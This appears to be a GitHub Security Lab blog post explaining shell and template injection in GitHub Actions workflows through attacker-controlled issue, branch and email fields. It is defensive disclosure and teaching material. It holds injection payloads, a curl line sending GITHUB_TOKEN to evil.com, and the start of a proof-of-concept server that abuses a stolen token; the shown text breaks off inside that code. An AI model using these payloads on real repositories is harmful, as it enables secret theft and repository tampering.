<!DOCTYPE html>
<html lang="en">

<head>
    <!-- META DATA -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <link rel="preload" href="/assets/css/index.css" as="style">
    <link rel="preload" href="/assets/js/main.js" as="script">
    <!--[if IE]><meta http-equiv="cleartype" content="on" /><![endif]-->
    <link rel="canonical" href="https://securitylab.github.com/resources/github-actions-untrusted-input/">
    <link rel="alternate" type="application/rss+xml" title="GitHub Security Lab" href="/feed.xml">
    <link rel="stylesheet" media="screen" href="/assets/css/index.css" />
    <script async src="https://js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js"></script>
    <script src="/assets/js/jquery.js"></script>
    <link id="favicon" rel="shortcut icon" type="image/ico" href="/assets/img/favicons/favicon.png" />
    <link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" />
    <link rel="icon" href="/assets/img/favicons/android-favicon.png">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Keeping your GitHub Actions and workflows secure Part 2: Untrusted input | GitHub Security Lab</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Keeping your GitHub Actions and workflows secure Part 2: Untrusted input" />
<meta name="author" content="jarlob" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Every GitHub Actions workflow trigger comes with a GitHub context. Some of this data might be attacker controlled and should be treated as potentially untrusted input." />
<meta property="og:description" content="Every GitHub Actions workflow trigger comes with a GitHub context. Some of this data might be attacker controlled and should be treated as potentially untrusted input." />
<link rel="canonical" href="https://securitylab.github.com/resources/github-actions-untrusted-input/" />
<meta property="og:url" content="https://securitylab.github.com/resources/github-actions-untrusted-input/" />
<meta property="og:site_name" content="GitHub Security Lab" />
<meta property="og:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-08-04T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="twitter:title" content="Keeping your GitHub Actions and workflows secure Part 2: Untrusted input" />
<meta name="twitter:site" content="@GHSecurityLab" />
<meta name="twitter:creator" content="@jarlob" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jarlob"},"dateModified":"2021-08-04T00:00:00+00:00","datePublished":"2021-08-04T00:00:00+00:00","description":"Every GitHub Actions workflow trigger comes with a GitHub context. Some of this data might be attacker controlled and should be treated as potentially untrusted input.","headline":"Keeping your GitHub Actions and workflows secure Part 2: Untrusted input","image":"https://securitylab.github.com/assets/img/social-card.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://securitylab.github.com/resources/github-actions-untrusted-input/"},"url":"https://securitylab.github.com/resources/github-actions-untrusted-input/"}</script>
<!-- End Jekyll SEO tag -->

    
    <meta name="ha-url" content="https://collector.githubapp.com/securitylab-website/collect">
    <script src="https://analytics.githubassets.com/hydro-marketing.min.js"></script>
</head>
  


<body class="no-js page-/resources/github-actions-untrusted-input page-blog">
  <a class="skip-to-content" href="#content">skip to content</a>

  <div
  id="site-navigation-container"
  class="site-navigation-container position-fixed top-0 width-full color-bg-transparent"
>
  <div
    className="position-relative site-navigation-container--background hide-sm hide-md"
  >
    <nav class="site-navigation nav d-block">
      <div
        class="container-xl py-2 d-none d-lg-flex flex-items-center flex-justify-between gap-0"
      >
        <a
          role="tab"
          title="Github"
          class="nav-logo"
          href="https://github.com"
          target="_blank"
        >
          <svg
            aria-hidden="true"
            role="img"
            class="nav-back-arrow position-absolute"
            viewBox="0 0 24 24"
            width="32"
            height="32"
            fill="currentColor"
            style="
              display: inline-block;
              user-select: none;
              vertical-align: text-bottom;
              overflow: visible;
            "
          >
            <path
              fill-rule="evenodd"
              d="M15.28 5.22a.75.75 0 00-1.06 0l-6.25 6.25a.75.75 0 000 1.06l6.25 6.25a.75.75 0 101.06-1.06L9.56 12l5.72-5.72a.75.75 0 000-1.06z"
            ></path>
          </svg>
          <svg
            height="32"
            class="octicon octicon-mark-github mr-2"
            viewBox="0 0 16 16"
            version="1.1"
            width="32"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
            ></path>
          </svg>
        </a>
        <span class="Slash-item"> / </span>
        <a
          aria-current="page"
          role="tab"
          title="Security Lab"
          class="nav-item nav-item--logo"
          href="/"
          >Security Lab</a
        >

        <div
          class="nav-body flex-auto flex-justify-start hide-sm hide-md"
          role="tablist"
        >
          <a
            role="tab"
            title="Research Blog"
            class="nav-item"
            href="https://github.blog/tag/github-security-lab/"
            target="_blank"
            >Research Blog</a
          >
          <a
            role="tab"
            title="Advisories"
            class="nav-item"
            href="/advisories/"
            >Advisories</a
          >
          <a
            role="tab"
            title="CodeQL Wall of Fame"
            class="nav-item"
            href="/codeql-wall-of-fame/"
            >CodeQL Wall of Fame</a
          >
          <button
            aria-label="Menu"
            aria-expanded="false"
            class="nav-item nav-item-button js-dropdown-menu-trigger"
          >
            Resources
          </button>
          <a
            role="tab"
            title="Events"
            class="nav-item"
            href="/events/"
            >Events</a
          >
        </div>

        <a
          href="/get-involved/"
          class="btn-get-involved hide-sm hide-md"
          ><span>Get Involved</span></a
        >
      </div>
    </nav>
  </div>

  <div
    class="navigation-dropdown left-0 width-full position-absolute color-bg-dark py-6"
  >
    <ul class="container-xl py-5 site-navigation__dropdown">
      <li class="pb-4 dropdown-title col-4">Resources</li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=" "
          href="/open-source"
          >Open Source Community</a
        >
      </li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=""
          href="/enterprise"
          >Enterprise</a
        >
      </li>
    </ul>
  </div>
</div>

<div
  class="mobile-navbar hide-lg hide-xl d-flex flex-items-center flex-justify-start"
>
  <a
    role="tab"
    title="Github"
    class="nav-logo"
    href="https://github.com"
    target="_blank"
  >
    <svg
      height="32"
      class="octicon octicon-mark-github mr-2"
      viewBox="0 0 16 16"
      version="1.1"
      width="32"
      aria-hidden="true"
    >
      <path
        fill-rule="evenodd"
        d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
      ></path>
    </svg>
  </a>
  <span class="Slash-item"> / </span>
  <a
    aria-current="page"
    role="tab"
    title="Security Lab"
    class="top-nav-item nav-item nav-item--logo"
    href="/"
    >Security Lab</a
  >
  <button
    aria-label="Menu"
    aria-expanded="false"
    class="sc-VigVT sc-jzJRlG nav-dropdown js-menu-trigger"
  >
    <svg
      class="caret-button"
      width="14"
      height="9"
      viewBox="0 0 14 9"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        fill-rule="evenodd"
        clip-rule="evenodd"
        d="M13.7803 0.71967C14.0732 1.01256 14.0732 1.48744 13.7803 1.78033L7.53033 8.03033C7.23744 8.32322 6.76256 8.32322 6.46967 8.03033L0.21967 1.78033C-0.0732231 1.48744 -0.0732231 1.01256 0.21967 0.71967C0.512563 0.426777 0.987437 0.426777 1.28033 0.71967L7 6.43934L12.7197 0.71967C13.0126 0.426777 13.4874 0.426777 13.7803 0.71967Z"
        fill="#24292F"
      />
    </svg>
  </button>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const toggleNavBtn = document.querySelector(".nav-dropdown");
      const mobileNav = document.querySelector(".mobile-nav");
      const caretIcon = document.querySelector(".caret-button");
      const backdrop = document.querySelector(".mobile-nav-screen");
      function toggleNavigation(event) {
        event.preventDefault();
        const expanded = toggleNavBtn.getAttribute("aria-expanded") === "true";

        toggleNavBtn.setAttribute("aria-expanded", !expanded);
        mobileNav.classList.toggle("expanded", !expanded);
        backdrop.classList.toggle("active", !expanded);

      }
      toggleNavBtn.addEventListener("click", toggleNavigation);
      toggleNavBtn.addEventListener("touchstart", toggleNavigation);

      backdrop.addEventListener("click", toggleNavigation);
      backdrop.addEventListener("touchstart", toggleNavigation);
    });
  </script>
</div>

<div class="mobile-nav">
  <div class="">
    <a
      role="tab"
      title="Research"
      class="nav-item "
      href="https://github.blog/tag/github-security-lab/"
      >Research</a
    >
    <a
      role="tab"
      title="Advisories"
      class="nav-item "
      href="/advisories/"
      >Advisories</a
    >
    <a
      role="tab"
      title="CodeQL Wall of Fame"
      class="nav-item "
      href="/codeql-wall-of-fame/"
      >CodeQL Wall of Fame</a
    >
    <div class="nav-item resources">
      <div
        class="nav-dropdown-item d-flex flex-justify-between flex-items-center"
      >
        <span>Resources</span>
        <svg
          class="mobile-caret"
          width="12"
          height="7"
          viewBox="0 0 12 7"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M11.6502 0.266554C11.8943 0.510632 11.8943 0.90636 11.6502 1.15044L6.44186 6.35877C6.19778 6.60285 5.80205 6.60285 5.55798 6.35877L0.349644 1.15044C0.105566 0.90636 0.105566 0.510632 0.349644 0.266554C0.593721 0.0224767 0.98945 0.0224767 1.23353 0.266554L5.99992 5.03295L10.7663 0.266554C11.0104 0.0224767 11.4061 0.0224767 11.6502 0.266554Z"
            fill="white"
          />
        </svg>
      </div>

      <div class="sub-menu">
        <a
          role="tab"
          title="Open Source Community"
          class="nav-inner-item "
          href="/open-source"
          >Open Source Community</a
        >
        <a
          role="tab"
          title="Enterprise"
          class="nav-inner-item "
          href="/enterprise"
          >Enterprise</a
        >
      </div>
    </div>
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/events/"
      >Events</a
    >
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/get-involved/"
      >Get Involved</a
    >
  </div>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const resources = document.querySelector(".nav-item.resources");
      const caret = resources.querySelector(".mobile-caret");
      const subMenu = resources.querySelector(".sub-menu");

      resources.addEventListener("click", function () {
        resources.classList.toggle("active");

        if (resources.classList.contains("active")) {
          // Force reflow
          subMenu.style.maxHeight = subMenu.scrollHeight + "px";
          subMenu.style.opacity = 1;
        } else {
          // Force reflow
          subMenu.style.maxHeight = "0";
          subMenu.style.opacity = 0;
        }
      });
    });
  </script>
</div>
<span class="mobile-nav-screen js-menu-trigger"></span>

<span class="dropdown-nav-screen js-dropdown-menu-trigger"></span>


  <div class="container-xl post-container p-responsive mt-md-76">
    <header class="post-header ">
      <div class="date text-mono mb-3 mb-md-2">August 4, 2021</div>
      <h1 class="page-title mb-3 mb-md-4 ">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</h1>

      
      
      
      
      

      

      <a target="_blank" class="mx-auto sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396" alt="Author avatar" height="35" width="35">
        <span>Jaroslav Lobačevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body post-content" aria-label="Content">
      <p><em>This post is the second in a series of posts about GitHub Actions security. <a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Part 1</a>, <a href="https://securitylab.github.com/research/github-actions-building-blocks/">Part 3</a>, <a href="https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/">Part 4</a></em></p>

<div style="border: 3px solid #ccc; padding: 10px; background-color:rgb(246, 215, 242); border-radius: 5px;">
  <strong>Secure your workflows with CodeQL:</strong> You can <a href="https://github.blog/changelog/2024-12-17-find-and-fix-actions-workflows-vulnerabilities-with-codeql-public-preview/">enable CodeQL for GitHub Actions</a> to identify and fix the patterns described in this post. 
</div>

<p><br /></p>

<p>We <a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">previously</a> discussed the misuse of the <code class="language-plaintext highlighter-rouge">pull_request_target</code> trigger within GitHub Actions and workflows. In this follow-up piece, we will discuss possible avenues of abuse that may result in code and command injection in otherwise seemingly secure workflows.</p>

<p>GitHub Actions workflows can be triggered by a variety of <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows">events</a>. Every workflow trigger is provided with a <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/context-and-expression-syntax-for-github-actions#github-context">GitHub context</a> that contains information about the triggering event, such as which user triggered it, the branch name, and <a href="https://docs.github.com/en/developers/webhooks-and-events/webhook-events-and-payloads">other event context details</a>. Some of this event data, like the base repository name, hash value of a changeset, or pull request number, is unlikely to be controlled or used for injection by the user that triggered the event (e.g. a pull request).</p>

<p>However, there is a long list of event context data that might be attacker controlled and should be treated as potentially untrusted input:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">github.event.issue.title</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.issue.body</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.pull_request.title</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.pull_request.body</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.comment.body</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.review.body</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.pages.*.page_name</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.commits.*.message</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.head_commit.message</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.head_commit.author.email</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.head_commit.author.name</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.commits.*.author.email</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.commits.*.author.name</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.pull_request.head.ref</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.pull_request.head.label</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.event.pull_request.head.repo.default_branch</code></li>
  <li><code class="language-plaintext highlighter-rouge">github.head_ref</code></li>
</ul>

<p>Developers should carefully handle potentially untrusted input and make sure it doesn’t flow into API calls where the data could be interpreted as code.</p>

<h2 id="vulnerable-actions">Vulnerable Actions</h2>

<p>For the <a href="https://www.ekoparty.org/en_US/ekoparty-2020">Ekoparty 2020 CTF</a> my colleague Bas Alberts <a href="https://securitylab.github.com/research/ekoparty-ctf/">created an intentionally vulnerable Action</a>, written in Python, that took the body of an issue creation event and used it to construct a system command in an insecure way:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">echo </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> &gt; /tmp/%s</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="n">notify_id</span><span class="p">))</span>
</code></pre></div></div>

<p>The CTF players were able to inject a shell command by creating a specially crafted issue that abused the insecure handling of untrusted input. As it turns out, truth is often stranger than fiction and I started finding similarly vulnerable GitHub Actions in the wild. For example the <a href="https://github.com/atlassian/gajira-comment">atlassian/gajira-comment</a> Action.</p>

<p>This GitHub Action synchronizes GitHub issue comments with a corresponding ticket in an internal Jira server. Below is an example usage:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-comment@v2.0.1</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">comment</span><span class="pi">:</span> <span class="pi">|</span>
    <span class="s">Comment created by {{ event.comment.user.login }}</span>
    <span class="s">{{ event.comment.body }}</span>
</code></pre></div></div>

<p>In the <code class="language-plaintext highlighter-rouge">comment</code> argument we can see a custom templating syntax. The Action was using lodash to interpolate values in <code class="language-plaintext highlighter-rouge">{{ }}</code> internally. This is safe as long as the template is controlled only by the creator of a workflow. Unfortunately it was mistakenly <a href="https://github.com/atlassian/gajira-comment/blob/c6c98ad99fa30a3f93cf28a1a4a11d0ee095d469/README.md">documented</a> that users of this Action should use the GitHub expression syntax - <code class="language-plaintext highlighter-rouge">${{ }}</code>. This opened the door to a double expression evaluation vulnerability.</p>

<p>Let’s say the Action user defined a workflow like:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-comment@v2.0.1</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">comment</span><span class="pi">:</span> <span class="pi">|</span>
    <span class="s">Comment created by ${{ event.comment.user.login }}</span>
    <span class="s">${{ github.event.comment.body }}</span>
</code></pre></div></div>

<p>In the normal use case the template would be evaluated even before reaching the Action, into something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Comment created by SomeUser
    It doesn't work on my machine.
</code></pre></div></div>

<p>There would be nothing to evaluate by the Action itself internally and it would work as expected. However if the user’s comment contained double curly braces itself, like <code class="language-plaintext highlighter-rouge">{{ 1 + 1 }}</code>, the argument would be evaluated into:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Comment created by SomeUser
    {{ 1 + 1 }}
</code></pre></div></div>

<p>Then the Action would treat it as a valid template syntax and lodash would interpolate it into:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Comment created by SomeUser
    2
</code></pre></div></div>

<p>The untrusted user input was used to generate a template which supports expression interpolation. The templating engine in question, lodash, was powerful enough to run arbitrary Node.js code in the context of the GitHub Actions runner.</p>

<h2 id="script-injections">Script injections</h2>

<p>A different example involves scenarios where the injection sink is directly located in the workflow inline script. GitHub Actions support their own <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/context-and-expression-syntax-for-github-actions">expression syntax</a> that allows access to the values of the workflow context. A workflow author often doesn’t even need to call any specific Action, as a lot can be accomplished using inline scripts with workflow expressions alone, e.g.:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Check title</span>
  <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
    <span class="s">title="${{ github.event.issue.title }}"</span>
    <span class="s">if [[ ! $title =~ ^.*:\ .*$ ]]; then</span>
      <span class="s">echo "Bad issue title"</span>
      <span class="s">exit 1</span>
    <span class="s">fi</span>
</code></pre></div></div>

<p>The issue here is that the <code class="language-plaintext highlighter-rouge">run</code> operation generates a temporary shell script based on the template. The expressions inside of <code class="language-plaintext highlighter-rouge">${{ }}</code> are evaluated and substituted with the resulting values before the shell script is run which may make it vulnerable to shell command injection. Attackers may inject a shell command with a payload like <code class="language-plaintext highlighter-rouge">a"; echo test</code> or <code class="language-plaintext highlighter-rouge">`echo test`</code>.</p>

<p>In case of a call to an Action like:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">uses</span><span class="pi">:</span> <span class="s">fakeaction/checktitle@v3</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">title</span><span class="pi">:</span> <span class="s">${{ github.event.issue.title }}</span>
</code></pre></div></div>

<p>the context value is not used to generate a shell script, but is passed as an argument to the action, so it is <em>not</em> vulnerable to the injection.</p>

<p>Most people understand that issue <code class="language-plaintext highlighter-rouge">title</code>, <code class="language-plaintext highlighter-rouge">body</code>, and <code class="language-plaintext highlighter-rouge">comment</code> contents in GitHub event contexts are fully controllable by would-be attackers. But there are also other less intuitive sources of potentially untrusted input. One of them is the originating branch name for a pull request. The allowed charset for branch names is somewhat limited and branches <a href="https://mirrors.edge.kernel.org/pub/software/scm/git/docs/git-check-ref-format.html">cannot have spaces or colons</a> in their names. However, command injection is still possible. For example <code class="language-plaintext highlighter-rouge">zzz";echo${IFS}"hello";#</code> would be a valid branch name. As we will see later this is more than enough for attackers to compromise the target repository.</p>

<p>Another less obvious source of untrusted input is email addresses. As described in the following <a href="https://en.wikipedia.org/wiki/Email_address">Wikipedia article</a>, email addresses can be quite flexible in terms of their content. All the listed addresses below are valid according to the relevant IETF standards and subsequent RFCs (5322, 6854):</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">" "@example.org</code></li>
  <li><code class="language-plaintext highlighter-rouge">mailhost!username@example.org</code></li>
  <li><code class="language-plaintext highlighter-rouge">user%example.com@example.org</code></li>
</ul>

<p>The address format is so complex that many validation scripts may erroneously block a registration of a valid, but less common email address. Nevertheless an email address like <code class="language-plaintext highlighter-rouge">`echo${IFS}hello`@domain.com</code> is perfectly valid and may be used for both shell injection and receiving emails at the same time.</p>

<h2 id="exploitability-and-impact">Exploitability and impact</h2>

<p>Let’s say there is a workflow with unsafe usage of an issue title in an inline script:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">echo "${{ github.event.issue.title }}"</span>
</code></pre></div></div>

<p>It can be injected with titles like <code class="language-plaintext highlighter-rouge">z"; exit 1;#</code> or <code class="language-plaintext highlighter-rouge">`id`</code>. This allows an arbitrary attacker controlled command execution similar to the arbitrary code execution discussed in <a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">the previous post</a>. So what can an attacker achieve with this kind of access in the context of a GitHub Actions runner?</p>

<p>Workflows triggered via the <code class="language-plaintext highlighter-rouge">pull_request</code> event have read-only permissions and no access to secrets. However, these permissions differ between the various event triggers such as <code class="language-plaintext highlighter-rouge">issue_comment</code>, <code class="language-plaintext highlighter-rouge">issues</code> and <code class="language-plaintext highlighter-rouge">push</code>. An attacker could try to steal the repository secrets or even the <a href="https://docs.github.com/en/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token">repository write access token</a>. If a secret or token is set to an environment variable like:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">env</span><span class="pi">:</span>
  <span class="na">GITHUB_TOKEN</span><span class="pi">:</span> <span class="s">${{ github.token }}</span>
  <span class="na">PUBLISH_KEY</span><span class="pi">:</span> <span class="s">${{ secrets.PUBLISH_KEY }}</span>
</code></pre></div></div>

<p>it can be directly accessed through the environment as demonstrated with e.g.: <code class="language-plaintext highlighter-rouge">`printenv`</code>.</p>

<p>If the secret is used directly in a expression like:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">publisher ${{ secrets.PUBLISH_KEY }}</span>
</code></pre></div></div>

<p>or</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">uses</span><span class="pi">:</span> <span class="s">fakeaction/publish@v3</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">key</span><span class="pi">:</span> <span class="s">${{ secrets.PUBLISH_KEY }}</span>
</code></pre></div></div>

<p>then, in the first case, the generated shell script is stored on disk and can be accessed there. In the second case it depends on the way the program is using the argument. For example <code class="language-plaintext highlighter-rouge">docker login</code> stores credentials on disk in <code class="language-plaintext highlighter-rouge">$HOME/.docker/config.json</code>, <a href="https://github.com/atlassian/gajira-login">Gajira-login action</a> stores the credentials in <code class="language-plaintext highlighter-rouge">$HOME/.jira.d/credentials</code>, and <a href="https://github.com/actions/checkout">Actions/checkout</a> action by default stores the repository token in a <code class="language-plaintext highlighter-rouge">.git/config</code> file unless the <code class="language-plaintext highlighter-rouge">persist-credentials: false</code> argument is set. Even if this is not the case the repository token and secrets are still in memory. Although GitHub Actions scrub secrets from memory that are not referenced in the workflow or in an included Action, the repository token, whether it is referenced or not, and any referenced secrets can be harvested by a determined attacker.</p>

<p>The next question for the attacker is how to exfiltrate such secrets from the runner. GitHub Actions <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets#accessing-your-secrets">automatically redact secrets printed to the log</a> in order to prevent accidental secret disclosure, but it is not a true security boundary since it is impossible to protect from intentional logging, so exfiltration of obfuscated secrets is still possible. For example: <code class="language-plaintext highlighter-rouge">echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};</code>. Also, since the attacker may run arbitrary commands it is possible to simply make a HTTP request to an external attacker-controlled server with the secret.</p>

<p>Getting a repository access token is a bit harder. An Action runner gets a generated token with permissions that are limited to the repository that contains the workflow and which expires after the workflow completes. Once expired, the token is no longer useful to an attacker. One way to work around this limitation, is to automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, e.g.: <code class="language-plaintext highlighter-rouge">a"; set +e; curl http://evil.com?token=$GITHUB_TOKEN;#</code>.</p>

<p>The attacker server can use the GitHub API to <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token">modify repository content</a>, including releases. Below is a proof of concept server that uses the leaked repo token to overwrite <code class="language-plaintext highlighter-rouge">package.json</code> in the root of an affected repository:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">github</span>  <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">@actions/github</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span>     <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">port</span>    <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">token</span>       <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">octokit</span>     <span class="o">=</span> <span class="nx">github</span><span class="p">.</span><span class="nf">getOctokit</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">fileContent</span> <span class="o">=</span> <span class="nx">Buffer</span>
      <span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="dl">'</span><span class="s1">{</span><span class="se">\n</span><span class="s1">}</span><span class="dl">'</span><span class="p">)</span>
      <span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">);</span>

    <span class="c1">// this is a targeted attack, repo name can be hardcoded</span>
    <span class="kd">const</span> <span class="nx">owner</span>      <span class="o">=</span> <span class="dl">'</span><span class="s1">owner</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">repo</span>       <span class="o">=</span> <span class="dl">'</span><span class="s1">repository</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">branchName</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">main</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">path</span>       <span class="o">=</span> <span class="dl">'</span><span class="s1">package.json</span><span class="dl">'</span><span class="p">;</span>

    <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">octokit</span><span class="p">.</span><span class="nx">repos</span><span class="p">.</span><span class="nf">getContent</span><span class="p">({</span>
      <span class="na">owner</span><span class="p">:</span> <span class="nx">owner</span><span class="p">,</span>
      <span class="na">repo</span><span class="p">:</span>  <span class="nx">repo</span><span class="p">,</span>
      <span class="na">ref</span><span class="p">:</span>   <span class="nx">branchName</span><span class="p">,</span>
      <span class="na">path</span><span class="p">:</span>  <span class="nx">path</span>
    <span class="p">});</span>

    <span class="k">await</span> <span class="nx">octokit</span><span class="p">.</span><span class="nx">repos</span><span class="p">.</span><span class="nf">createOrUpdateFileContents</span><span class="p">({</span>
      <span class="na">owner</span><span class="p">:</span>   <span class="nx">owner</span><span class="p">,</span>
